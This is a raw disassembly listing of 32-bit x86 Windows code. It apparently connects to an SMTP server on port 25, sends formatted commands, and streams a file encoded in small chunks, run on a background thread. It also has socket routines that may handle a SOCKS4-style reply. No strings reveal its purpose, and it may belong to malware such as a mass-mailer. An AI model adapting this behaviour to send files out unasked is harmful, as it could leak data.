1314723a:	b9 81 01 00 00       	mov    $0x181,%ecx
1314723f:	8d b5 6c f4 ff ff    	lea    -0xb94(%ebp),%esi
13147245:	81 ec 04 06 00 00    	sub    $0x604,%esp
1314724b:	8b fc                	mov    %esp,%edi
1314724d:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
1314724f:	e8 98 18 00 00       	call   0x13148aec
13147254:	81 c4 08 06 00 00    	add    $0x608,%esp
1314725a:	6a ff                	push   $0xffffffff
1314725c:	ff 15 80 33 15 13    	call   *0x13153380
13147262:	6a 05                	push   $0x5
13147264:	5e                   	pop    %esi
13147265:	e9 a6 05 00 00       	jmp    0x13147810
1314726a:	8d 85 70 fa ff ff    	lea    -0x590(%ebp),%eax
13147270:	50                   	push   %eax
13147271:	57                   	push   %edi
13147272:	e8 70 e9 ff ff       	call   0x13145be7
13147277:	59                   	pop    %ecx
13147278:	59                   	pop    %ecx
13147279:	6a 06                	push   $0x6
1314727b:	6a 01                	push   $0x1
1314727d:	6a 02                	push   $0x2
1314727f:	ff 15 64 35 15 13    	call   *0x13153564
13147285:	8b d8                	mov    %eax,%ebx
13147287:	83 fb ff             	cmp    $0xffffffff,%ebx
1314728a:	75 08                	jne    0x13147294
1314728c:	6a 06                	push   $0x6
1314728e:	58                   	pop    %eax
1314728f:	e9 86 05 00 00       	jmp    0x1314781a
13147294:	68 d0 3c 15 13       	push   $0x13153cd0
13147299:	ff 15 ac 39 15 13    	call   *0x131539ac
1314729f:	83 f8 ff             	cmp    $0xffffffff,%eax
131472a2:	68 d0 3c 15 13       	push   $0x13153cd0
131472a7:	75 07                	jne    0x131472b0
131472a9:	e8 78 e1 ff ff       	call   0x13145426
131472ae:	59                   	pop    %ecx
131472af:	50                   	push   %eax
131472b0:	ff 15 ac 39 15 13    	call   *0x131539ac
131472b6:	6a 19                	push   $0x19
131472b8:	89 45 e8             	mov    %eax,-0x18(%ebp)
131472bb:	66 c7 45 e4 02 00    	movw   $0x2,-0x1c(%ebp)
131472c1:	ff 15 8c 37 15 13    	call   *0x1315378c
131472c7:	66 89 45 e6          	mov    %ax,-0x1a(%ebp)
131472cb:	8d 45 e4             	lea    -0x1c(%ebp),%eax
131472ce:	6a 10                	push   $0x10
131472d0:	50                   	push   %eax
131472d1:	53                   	push   %ebx
131472d2:	ff 15 34 37 15 13    	call   *0x13153734
131472d8:	83 f8 ff             	cmp    $0xffffffff,%eax
131472db:	75 51                	jne    0x1314732e
131472dd:	68 d0 3c 15 13       	push   $0x13153cd0
131472e2:	8d 85 6c f6 ff ff    	lea    -0x994(%ebp),%eax
131472e8:	68 ec 09 15 13       	push   $0x131509ec
131472ed:	50                   	push   %eax
131472ee:	ff 15 98 39 15 13    	call   *0x13153998
131472f4:	83 c4 0c             	add    $0xc,%esp
131472f7:	80 3d dc 3d 15 13 00 	cmpb   $0x0,0x13153ddc
131472fe:	75 26                	jne    0x13147326
13147300:	ff 35 d4 3d 15 13    	pushl  0x13153dd4
13147306:	b9 81 01 00 00       	mov    $0x181,%ecx
1314730b:	8d b5 6c f4 ff ff    	lea    -0xb94(%ebp),%esi
13147311:	81 ec 04 06 00 00    	sub    $0x604,%esp
13147317:	8b fc                	mov    %esp,%edi
13147319:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
1314731b:	e8 cc 17 00 00       	call   0x13148aec
13147320:	81 c4 08 06 00 00    	add    $0x608,%esp
13147326:	6a 07                	push   $0x7
13147328:	5e                   	pop    %esi
13147329:	e9 d9 04 00 00       	jmp    0x13147807
1314732e:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
13147334:	68 d8 09 15 13       	push   $0x131509d8
13147339:	50                   	push   %eax
1314733a:	ff 15 98 39 15 13    	call   *0x13153998
13147340:	59                   	pop    %ecx
13147341:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
13147347:	59                   	pop    %ecx
13147348:	56                   	push   %esi
13147349:	50                   	push   %eax
1314734a:	e8 ae b3 ff ff       	call   0x131426fd
1314734f:	59                   	pop    %ecx
13147350:	50                   	push   %eax
13147351:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
13147357:	50                   	push   %eax
13147358:	53                   	push   %ebx
13147359:	ff 15 68 37 15 13    	call   *0x13153768
1314735f:	53                   	push   %ebx
13147360:	e8 ce e8 ff ff       	call   0x13145c33
13147365:	c7 04 24 50 3a 15 13 	movl   $0x13153a50,(%esp)
1314736c:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
13147372:	68 c8 09 15 13       	push   $0x131509c8
13147377:	50                   	push   %eax
13147378:	ff 15 98 39 15 13    	call   *0x13153998
1314737e:	83 c4 0c             	add    $0xc,%esp
13147381:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
13147387:	56                   	push   %esi
13147388:	50                   	push   %eax
13147389:	e8 6f b3 ff ff       	call   0x131426fd
1314738e:	59                   	pop    %ecx
1314738f:	50                   	push   %eax
13147390:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
13147396:	50                   	push   %eax
13147397:	53                   	push   %ebx
13147398:	ff 15 68 37 15 13    	call   *0x13153768
1314739e:	53                   	push   %ebx
1314739f:	e8 8f e8 ff ff       	call   0x13145c33
131473a4:	c7 04 24 54 3d 15 13 	movl   $0x13153d54,(%esp)
131473ab:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
131473b1:	68 b8 09 15 13       	push   $0x131509b8
131473b6:	50                   	push   %eax
131473b7:	ff 15 98 39 15 13    	call   *0x13153998
131473bd:	83 c4 0c             	add    $0xc,%esp
131473c0:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
131473c6:	56                   	push   %esi
131473c7:	50                   	push   %eax
131473c8:	e8 30 b3 ff ff       	call   0x131426fd
131473cd:	59                   	pop    %ecx
131473ce:	50                   	push   %eax
131473cf:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
131473d5:	50                   	push   %eax
131473d6:	53                   	push   %ebx
131473d7:	ff 15 68 37 15 13    	call   *0x13153768
131473dd:	53                   	push   %ebx
131473de:	e8 50 e8 ff ff       	call   0x13145c33
131473e3:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
131473e9:	c7 04 24 b0 09 15 13 	movl   $0x131509b0,(%esp)
131473f0:	50                   	push   %eax
131473f1:	ff 15 98 39 15 13    	call   *0x13153998
131473f7:	59                   	pop    %ecx
131473f8:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
131473fe:	59                   	pop    %ecx
131473ff:	56                   	push   %esi
13147400:	50                   	push   %eax
13147401:	e8 f7 b2 ff ff       	call   0x131426fd
13147406:	59                   	pop    %ecx
13147407:	50                   	push   %eax
13147408:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
1314740e:	50                   	push   %eax
1314740f:	53                   	push   %ebx
13147410:	ff 15 68 37 15 13    	call   *0x13153768
13147416:	53                   	push   %ebx
13147417:	e8 17 e8 ff ff       	call   0x13145c33
1314741c:	8d 85 70 fa ff ff    	lea    -0x590(%ebp),%eax
13147422:	50                   	push   %eax
13147423:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
13147429:	68 a0 09 15 13       	push   $0x131509a0
1314742e:	50                   	push   %eax
1314742f:	ff 15 98 39 15 13    	call   *0x13153998
13147435:	83 c4 10             	add    $0x10,%esp
13147438:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
1314743e:	56                   	push   %esi
1314743f:	50                   	push   %eax
13147440:	e8 b8 b2 ff ff       	call   0x131426fd
13147445:	59                   	pop    %ecx
13147446:	50                   	push   %eax
13147447:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
1314744d:	50                   	push   %eax
1314744e:	53                   	push   %ebx
1314744f:	ff 15 68 37 15 13    	call   *0x13153768
13147455:	68 64 09 15 13       	push   $0x13150964
1314745a:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
13147460:	68 60 09 15 13       	push   $0x13150960
13147465:	50                   	push   %eax
13147466:	ff 15 98 39 15 13    	call   *0x13153998
1314746c:	83 c4 0c             	add    $0xc,%esp
1314746f:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
13147475:	56                   	push   %esi
13147476:	50                   	push   %eax
13147477:	e8 81 b2 ff ff       	call   0x131426fd
1314747c:	59                   	pop    %ecx
1314747d:	50                   	push   %eax
1314747e:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
13147484:	50                   	push   %eax
13147485:	53                   	push   %ebx
13147486:	ff 15 68 37 15 13    	call   *0x13153768
1314748c:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
13147492:	68 4c 09 15 13       	push   $0x1315094c
13147497:	50                   	push   %eax
13147498:	ff 15 98 39 15 13    	call   *0x13153998
1314749e:	59                   	pop    %ecx
1314749f:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
131474a5:	59                   	pop    %ecx
131474a6:	56                   	push   %esi
131474a7:	50                   	push   %eax
131474a8:	e8 50 b2 ff ff       	call   0x131426fd
131474ad:	59                   	pop    %ecx
131474ae:	50                   	push   %eax
131474af:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
131474b5:	50                   	push   %eax
131474b6:	53                   	push   %ebx
131474b7:	ff 15 68 37 15 13    	call   *0x13153768
131474bd:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
131474c3:	68 1c 09 15 13       	push   $0x1315091c
131474c8:	50                   	push   %eax
131474c9:	ff 15 98 39 15 13    	call   *0x13153998
131474cf:	59                   	pop    %ecx
131474d0:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
131474d6:	59                   	pop    %ecx
131474d7:	56                   	push   %esi
131474d8:	50                   	push   %eax
131474d9:	e8 1f b2 ff ff       	call   0x131426fd
131474de:	59                   	pop    %ecx
131474df:	50                   	push   %eax
131474e0:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
131474e6:	50                   	push   %eax
131474e7:	53                   	push   %ebx
131474e8:	ff 15 68 37 15 13    	call   *0x13153768
131474ee:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
131474f4:	68 14 09 15 13       	push   $0x13150914
131474f9:	50                   	push   %eax
131474fa:	ff 15 98 39 15 13    	call   *0x13153998
13147500:	59                   	pop    %ecx
13147501:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
13147507:	59                   	pop    %ecx
13147508:	56                   	push   %esi
13147509:	50                   	push   %eax
1314750a:	e8 ee b1 ff ff       	call   0x131426fd
1314750f:	59                   	pop    %ecx
13147510:	50                   	push   %eax
13147511:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
13147517:	50                   	push   %eax
13147518:	53                   	push   %ebx
13147519:	ff 15 68 37 15 13    	call   *0x13153768
1314751f:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
13147525:	68 e8 08 15 13       	push   $0x131508e8
1314752a:	50                   	push   %eax
1314752b:	ff 15 98 39 15 13    	call   *0x13153998
13147531:	59                   	pop    %ecx
13147532:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
13147538:	59                   	pop    %ecx
13147539:	56                   	push   %esi
1314753a:	50                   	push   %eax
1314753b:	e8 bd b1 ff ff       	call   0x131426fd
13147540:	59                   	pop    %ecx
13147541:	50                   	push   %eax
13147542:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
13147548:	50                   	push   %eax
13147549:	53                   	push   %ebx
1314754a:	ff 15 68 37 15 13    	call   *0x13153768
13147550:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
13147556:	68 b8 08 15 13       	push   $0x131508b8
1314755b:	50                   	push   %eax
1314755c:	ff 15 98 39 15 13    	call   *0x13153998
13147562:	59                   	pop    %ecx
13147563:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
13147569:	59                   	pop    %ecx
1314756a:	56                   	push   %esi
1314756b:	50                   	push   %eax
1314756c:	e8 8c b1 ff ff       	call   0x131426fd
13147571:	59                   	pop    %ecx
13147572:	50                   	push   %eax
13147573:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
13147579:	50                   	push   %eax
1314757a:	53                   	push   %ebx
1314757b:	ff 15 68 37 15 13    	call   *0x13153768
13147581:	8d 45 f4             	lea    -0xc(%ebp),%eax
13147584:	50                   	push   %eax
13147585:	ff 75 fc             	pushl  -0x4(%ebp)
13147588:	ff 15 a8 39 15 13    	call   *0x131539a8
1314758e:	50                   	push   %eax
1314758f:	e8 49 16 00 00       	call   0x13148bdd
13147594:	50                   	push   %eax
13147595:	57                   	push   %edi
13147596:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
1314759c:	68 80 08 15 13       	push   $0x13150880
131475a1:	50                   	push   %eax
131475a2:	ff 15 98 39 15 13    	call   *0x13153998
131475a8:	83 c4 14             	add    $0x14,%esp
131475ab:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
131475b1:	56                   	push   %esi
131475b2:	50                   	push   %eax
131475b3:	e8 45 b1 ff ff       	call   0x131426fd
131475b8:	59                   	pop    %ecx
131475b9:	50                   	push   %eax
131475ba:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
131475c0:	50                   	push   %eax
131475c1:	53                   	push   %ebx
131475c2:	ff 15 68 37 15 13    	call   *0x13153768
131475c8:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
131475ce:	68 14 09 15 13       	push   $0x13150914
131475d3:	50                   	push   %eax
131475d4:	ff 15 98 39 15 13    	call   *0x13153998
131475da:	59                   	pop    %ecx
131475db:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
131475e1:	59                   	pop    %ecx
131475e2:	56                   	push   %esi
131475e3:	50                   	push   %eax
131475e4:	e8 14 b1 ff ff       	call   0x131426fd
131475e9:	59                   	pop    %ecx
131475ea:	50                   	push   %eax
131475eb:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
131475f1:	50                   	push   %eax
131475f2:	53                   	push   %ebx
131475f3:	ff 15 68 37 15 13    	call   *0x13153768
131475f9:	8d 85 70 fa ff ff    	lea    -0x590(%ebp),%eax
131475ff:	50                   	push   %eax
13147600:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
13147606:	68 58 08 15 13       	push   $0x13150858
1314760b:	50                   	push   %eax
1314760c:	ff 15 98 39 15 13    	call   *0x13153998
13147612:	83 c4 0c             	add    $0xc,%esp
13147615:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
1314761b:	56                   	push   %esi
1314761c:	50                   	push   %eax
1314761d:	e8 db b0 ff ff       	call   0x131426fd
13147622:	59                   	pop    %ecx
13147623:	50                   	push   %eax
13147624:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
1314762a:	50                   	push   %eax
1314762b:	53                   	push   %ebx
1314762c:	ff 15 68 37 15 13    	call   *0x13153768
13147632:	68 30 08 15 13       	push   $0x13150830
13147637:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
1314763d:	50                   	push   %eax
1314763e:	ff 15 98 39 15 13    	call   *0x13153998
13147644:	59                   	pop    %ecx
13147645:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
1314764b:	59                   	pop    %ecx
1314764c:	56                   	push   %esi
1314764d:	50                   	push   %eax
1314764e:	e8 aa b0 ff ff       	call   0x131426fd
13147653:	59                   	pop    %ecx
13147654:	50                   	push   %eax
13147655:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
1314765b:	50                   	push   %eax
1314765c:	53                   	push   %ebx
1314765d:	ff 15 68 37 15 13    	call   *0x13153768
13147663:	6a 2a                	push   $0x2a
13147665:	8d 45 b8             	lea    -0x48(%ebp),%eax
13147668:	56                   	push   %esi
13147669:	50                   	push   %eax
1314766a:	e8 b3 af ff ff       	call   0x13142622
1314766f:	6a 48                	push   $0x48
13147671:	8d 85 70 ff ff ff    	lea    -0x90(%ebp),%eax
13147677:	56                   	push   %esi
13147678:	50                   	push   %eax
13147679:	e8 a4 af ff ff       	call   0x13142622
1314767e:	83 c4 18             	add    $0x18,%esp
13147681:	8d 45 f8             	lea    -0x8(%ebp),%eax
13147684:	56                   	push   %esi
13147685:	50                   	push   %eax
13147686:	8d 45 b8             	lea    -0x48(%ebp),%eax
13147689:	6a 2a                	push   $0x2a
1314768b:	50                   	push   %eax
1314768c:	ff 75 fc             	pushl  -0x4(%ebp)
1314768f:	ff 15 54 35 15 13    	call   *0x13153554
13147695:	85 c0                	test   %eax,%eax
13147697:	74 46                	je     0x131476df
13147699:	8d 85 70 ff ff ff    	lea    -0x90(%ebp),%eax
1314769f:	6a 48                	push   $0x48
131476a1:	50                   	push   %eax
131476a2:	8d 45 b8             	lea    -0x48(%ebp),%eax
131476a5:	ff 75 f8             	pushl  -0x8(%ebp)
131476a8:	50                   	push   %eax
131476a9:	e8 21 9d ff ff       	call   0x131413cf
131476ae:	8b f8                	mov    %eax,%edi
131476b0:	8d 85 70 ff ff ff    	lea    -0x90(%ebp),%eax
131476b6:	50                   	push   %eax
131476b7:	e8 41 b0 ff ff       	call   0x131426fd
131476bc:	80 a4 05 70 ff ff ff 	andb   $0x0,-0x90(%ebp,%eax,1)
131476c3:	00 
131476c4:	83 c4 14             	add    $0x14,%esp
131476c7:	8d 85 70 ff ff ff    	lea    -0x90(%ebp),%eax
131476cd:	56                   	push   %esi
131476ce:	57                   	push   %edi
131476cf:	50                   	push   %eax
131476d0:	53                   	push   %ebx
131476d1:	ff 15 68 37 15 13    	call   *0x13153768
131476d7:	83 7d f8 2a          	cmpl   $0x2a,-0x8(%ebp)
131476db:	72 09                	jb     0x131476e6
131476dd:	eb 84                	jmp    0x13147663
131476df:	6a 08                	push   $0x8
131476e1:	e9 19 01 00 00       	jmp    0x131477ff
131476e6:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
131476ec:	68 2c 08 15 13       	push   $0x1315082c
131476f1:	50                   	push   %eax
131476f2:	ff 15 98 39 15 13    	call   *0x13153998
131476f8:	59                   	pop    %ecx
131476f9:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
131476ff:	59                   	pop    %ecx
13147700:	56                   	push   %esi
13147701:	50                   	push   %eax
13147702:	e8 f6 af ff ff       	call   0x131426fd
13147707:	59                   	pop    %ecx
13147708:	50                   	push   %eax
13147709:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
1314770f:	50                   	push   %eax
13147710:	53                   	push   %ebx
13147711:	ff 15 68 37 15 13    	call   *0x13153768
13147717:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
1314771d:	68 20 08 15 13       	push   $0x13150820
13147722:	50                   	push   %eax
13147723:	ff 15 98 39 15 13    	call   *0x13153998
13147729:	59                   	pop    %ecx
1314772a:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
13147730:	59                   	pop    %ecx
13147731:	56                   	push   %esi
13147732:	50                   	push   %eax
13147733:	e8 c5 af ff ff       	call   0x131426fd
13147738:	59                   	pop    %ecx
13147739:	50                   	push   %eax
1314773a:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
13147740:	50                   	push   %eax
13147741:	53                   	push   %ebx
13147742:	ff 15 68 37 15 13    	call   *0x13153768
13147748:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
1314774e:	68 1c 08 15 13       	push   $0x1315081c
13147753:	50                   	push   %eax
13147754:	ff 15 98 39 15 13    	call   *0x13153998
1314775a:	59                   	pop    %ecx
1314775b:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
13147761:	59                   	pop    %ecx
13147762:	56                   	push   %esi
13147763:	50                   	push   %eax
13147764:	e8 94 af ff ff       	call   0x131426fd
13147769:	59                   	pop    %ecx
1314776a:	50                   	push   %eax
1314776b:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
13147771:	50                   	push   %eax
13147772:	53                   	push   %ebx
13147773:	ff 15 68 37 15 13    	call   *0x13153768
13147779:	53                   	push   %ebx
1314777a:	e8 b4 e4 ff ff       	call   0x13145c33
1314777f:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
13147785:	c7 04 24 14 08 15 13 	movl   $0x13150814,(%esp)
1314778c:	50                   	push   %eax
1314778d:	ff 15 98 39 15 13    	call   *0x13153998
13147793:	59                   	pop    %ecx
13147794:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
1314779a:	59                   	pop    %ecx
1314779b:	56                   	push   %esi
1314779c:	50                   	push   %eax
1314779d:	e8 5b af ff ff       	call   0x131426fd
131477a2:	59                   	pop    %ecx
131477a3:	50                   	push   %eax
131477a4:	8d 85 70 fb ff ff    	lea    -0x490(%ebp),%eax
131477aa:	50                   	push   %eax
131477ab:	53                   	push   %ebx
131477ac:	ff 15 68 37 15 13    	call   *0x13153768
131477b2:	53                   	push   %ebx
131477b3:	e8 7b e4 ff ff       	call   0x13145c33
131477b8:	8d 85 6c f6 ff ff    	lea    -0x994(%ebp),%eax
131477be:	c7 04 24 fc 07 15 13 	movl   $0x131507fc,(%esp)
131477c5:	50                   	push   %eax
131477c6:	ff 15 98 39 15 13    	call   *0x13153998
131477cc:	80 3d dc 3d 15 13 00 	cmpb   $0x0,0x13153ddc
131477d3:	59                   	pop    %ecx
131477d4:	59                   	pop    %ecx
131477d5:	75 26                	jne    0x131477fd
131477d7:	ff 35 d4 3d 15 13    	pushl  0x13153dd4
131477dd:	b9 81 01 00 00       	mov    $0x181,%ecx
131477e2:	8d b5 6c f4 ff ff    	lea    -0xb94(%ebp),%esi
131477e8:	81 ec 04 06 00 00    	sub    $0x604,%esp
131477ee:	8b fc                	mov    %esp,%edi
131477f0:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
131477f2:	e8 f5 12 00 00       	call   0x13148aec
131477f7:	81 c4 08 06 00 00    	add    $0x608,%esp
131477fd:	6a 01                	push   $0x1
131477ff:	5e                   	pop    %esi
13147800:	53                   	push   %ebx
13147801:	ff 15 e4 36 15 13    	call   *0x131536e4
13147807:	ff 75 fc             	pushl  -0x4(%ebp)
1314780a:	ff 15 80 33 15 13    	call   *0x13153380
13147810:	a1 50 3d 15 13       	mov    0x13153d50,%eax
13147815:	80 20 00             	andb   $0x0,(%eax)
13147818:	8b c6                	mov    %esi,%eax
1314781a:	5f                   	pop    %edi
1314781b:	5e                   	pop    %esi
1314781c:	5b                   	pop    %ebx
1314781d:	c9                   	leave  
1314781e:	c2 04 00             	ret    $0x4
13147821:	55                   	push   %ebp
13147822:	8b ec                	mov    %esp,%ebp
13147824:	51                   	push   %ecx
13147825:	56                   	push   %esi
13147826:	ff 75 08             	pushl  0x8(%ebp)
13147829:	e8 cf ae ff ff       	call   0x131426fd
1314782e:	be 80 00 00 00       	mov    $0x80,%esi
13147833:	59                   	pop    %ecx
13147834:	3b c6                	cmp    %esi,%eax
13147836:	0f 8f ce 00 00 00    	jg     0x1314790a
1314783c:	ff 75 10             	pushl  0x10(%ebp)
1314783f:	e8 b9 ae ff ff       	call   0x131426fd
13147844:	3b c6                	cmp    %esi,%eax
13147846:	59                   	pop    %ecx
13147847:	0f 8f bd 00 00 00    	jg     0x1314790a
1314784d:	ff 75 14             	pushl  0x14(%ebp)
13147850:	e8 a8 ae ff ff       	call   0x131426fd
13147855:	3b c6                	cmp    %esi,%eax
13147857:	59                   	pop    %ecx
13147858:	0f 8f ac 00 00 00    	jg     0x1314790a
1314785e:	ff 75 18             	pushl  0x18(%ebp)
13147861:	e8 97 ae ff ff       	call   0x131426fd
13147866:	be 00 01 00 00       	mov    $0x100,%esi
1314786b:	59                   	pop    %ecx
1314786c:	3b c6                	cmp    %esi,%eax
1314786e:	0f 8f 96 00 00 00    	jg     0x1314790a
13147874:	ff 75 1c             	pushl  0x1c(%ebp)
13147877:	e8 81 ae ff ff       	call   0x131426fd
1314787c:	3b c6                	cmp    %esi,%eax
1314787e:	59                   	pop    %ecx
1314787f:	0f 8f 85 00 00 00    	jg     0x1314790a
13147885:	ff 75 08             	pushl  0x8(%ebp)
13147888:	be 00 d1 14 13       	mov    $0x1314d100,%esi
1314788d:	56                   	push   %esi
1314788e:	68 d0 3c 15 13       	push   $0x13153cd0
13147893:	ff 15 98 39 15 13    	call   *0x13153998
13147899:	ff 75 10             	pushl  0x10(%ebp)
1314789c:	56                   	push   %esi
1314789d:	68 50 3a 15 13       	push   $0x13153a50
131478a2:	ff 15 98 39 15 13    	call   *0x13153998
131478a8:	ff 75 14             	pushl  0x14(%ebp)
131478ab:	56                   	push   %esi
131478ac:	68 54 3d 15 13       	push   $0x13153d54
131478b1:	ff 15 98 39 15 13    	call   *0x13153998
131478b7:	ff 75 18             	pushl  0x18(%ebp)
131478ba:	56                   	push   %esi
131478bb:	68 d0 3b 15 13       	push   $0x13153bd0
131478c0:	ff 15 98 39 15 13    	call   *0x13153998
131478c6:	ff 75 1c             	pushl  0x1c(%ebp)
131478c9:	56                   	push   %esi
131478ca:	68 d0 3a 15 13       	push   $0x13153ad0
131478cf:	ff 15 98 39 15 13    	call   *0x13153998
131478d5:	8a 45 20             	mov    0x20(%ebp),%al
131478d8:	83 c4 3c             	add    $0x3c,%esp
131478db:	a2 dc 3d 15 13       	mov    %al,0x13153ddc
131478e0:	8b 45 28             	mov    0x28(%ebp),%eax
131478e3:	a3 d4 3d 15 13       	mov    %eax,0x13153dd4
131478e8:	8b 45 24             	mov    0x24(%ebp),%eax
131478eb:	a3 50 3d 15 13       	mov    %eax,0x13153d50
131478f0:	c6 00 01             	movb   $0x1,(%eax)
131478f3:	8d 45 fc             	lea    -0x4(%ebp),%eax
131478f6:	50                   	push   %eax
131478f7:	33 c0                	xor    %eax,%eax
131478f9:	50                   	push   %eax
131478fa:	50                   	push   %eax
131478fb:	68 d0 71 14 13       	push   $0x131471d0
13147900:	50                   	push   %eax
13147901:	50                   	push   %eax
13147902:	ff 15 30 37 15 13    	call   *0x13153730
13147908:	eb 02                	jmp    0x1314790c
1314790a:	33 c0                	xor    %eax,%eax
1314790c:	5e                   	pop    %esi
1314790d:	c9                   	leave  
1314790e:	c3                   	ret    
1314790f:	55                   	push   %ebp
13147910:	8b ec                	mov    %esp,%ebp
13147912:	81 ec 3c 01 00 00    	sub    $0x13c,%esp
13147918:	53                   	push   %ebx
13147919:	33 db                	xor    %ebx,%ebx
1314791b:	56                   	push   %esi
1314791c:	57                   	push   %edi
1314791d:	89 5d f8             	mov    %ebx,-0x8(%ebp)
13147920:	c7 45 f0 01 00 00 00 	movl   $0x1,-0x10(%ebp)
13147927:	be 7e 66 04 80       	mov    $0x8004667e,%esi
1314792c:	39 1d e8 3e 16 13    	cmp    %ebx,0x13163ee8
13147932:	0f 84 71 02 00 00    	je     0x13147ba9
13147938:	33 c0                	xor    %eax,%eax
1314793a:	8d 7d ca             	lea    -0x36(%ebp),%edi
1314793d:	66 89 5d c8          	mov    %bx,-0x38(%ebp)
13147941:	c7 85 c4 fe ff ff 01 	movl   $0x1,-0x13c(%ebp)
13147948:	00 00 00 
1314794b:	ab                   	stos   %eax,%es:(%edi)
1314794c:	ab                   	stos   %eax,%es:(%edi)
1314794d:	ab                   	stos   %eax,%es:(%edi)
1314794e:	66 ab                	stos   %ax,%es:(%edi)
13147950:	8b 45 08             	mov    0x8(%ebp),%eax
13147953:	8d 7d ec             	lea    -0x14(%ebp),%edi
13147956:	89 85 c8 fe ff ff    	mov    %eax,-0x138(%ebp)
1314795c:	33 c0                	xor    %eax,%eax
1314795e:	ab                   	stos   %eax,%es:(%edi)
1314795f:	8d 45 e8             	lea    -0x18(%ebp),%eax
13147962:	c7 45 e8 1e 00 00 00 	movl   $0x1e,-0x18(%ebp)
13147969:	50                   	push   %eax
1314796a:	53                   	push   %ebx
1314796b:	8d 85 c4 fe ff ff    	lea    -0x13c(%ebp),%eax
13147971:	53                   	push   %ebx
13147972:	50                   	push   %eax
13147973:	53                   	push   %ebx
13147974:	88 5d ff             	mov    %bl,-0x1(%ebp)
13147977:	ff 15 fc 33 15 13    	call   *0x131533fc
1314797d:	83 f8 ff             	cmp    $0xffffffff,%eax
13147980:	0f 84 23 02 00 00    	je     0x13147ba9
13147986:	3b c3                	cmp    %ebx,%eax
13147988:	0f 84 1b 02 00 00    	je     0x13147ba9
1314798e:	8d 45 f4             	lea    -0xc(%ebp),%eax
13147991:	89 5d f4             	mov    %ebx,-0xc(%ebp)
13147994:	50                   	push   %eax
13147995:	56                   	push   %esi
13147996:	ff 75 08             	pushl  0x8(%ebp)
13147999:	ff 15 14 34 15 13    	call   *0x13153414
1314799f:	6a 02                	push   $0x2
131479a1:	6a 01                	push   $0x1
131479a3:	5f                   	pop    %edi
131479a4:	8d 45 ff             	lea    -0x1(%ebp),%eax
131479a7:	57                   	push   %edi
131479a8:	50                   	push   %eax
131479a9:	ff 75 08             	pushl  0x8(%ebp)
131479ac:	ff 15 4c 37 15 13    	call   *0x1315374c
131479b2:	80 7d ff 04          	cmpb   $0x4,-0x1(%ebp)
131479b6:	0f 85 ed 01 00 00    	jne    0x13147ba9
131479bc:	53                   	push   %ebx
131479bd:	8d 45 e0             	lea    -0x20(%ebp),%eax
131479c0:	6a 08                	push   $0x8
131479c2:	50                   	push   %eax
131479c3:	ff 75 08             	pushl  0x8(%ebp)
131479c6:	ff 15 4c 37 15 13    	call   *0x1315374c
131479cc:	83 f8 ff             	cmp    $0xffffffff,%eax
131479cf:	0f 84 d4 01 00 00    	je     0x13147ba9
131479d5:	8d 45 f4             	lea    -0xc(%ebp),%eax
131479d8:	89 7d f4             	mov    %edi,-0xc(%ebp)
131479db:	50                   	push   %eax
131479dc:	56                   	push   %esi
131479dd:	ff 75 08             	pushl  0x8(%ebp)
